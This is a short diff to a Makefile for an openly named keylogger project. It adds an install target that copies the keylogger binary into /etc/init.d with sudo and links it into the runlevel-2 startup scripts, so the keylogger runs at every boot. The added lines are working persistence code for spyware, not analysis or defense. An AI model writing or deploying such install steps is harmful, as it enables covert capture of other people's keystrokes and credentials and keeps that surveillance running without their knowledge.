@@ -1,5 +1,10 @@
 all: keylogger.out
 
+install: all
+	sudo cp keylogger.out /etc/init.d/keylogger
+	sudo chmod +x /etc/init.d/keylogger
+	sudo ln -s /etc/init.d/keylogger /etc/rc2.d/S99keylogger
+
 keylogger.out: main.o help.o keylogger.o
 	gcc -o keylogger.out objects/main.o objects/help.o objects/keylogger.o
 
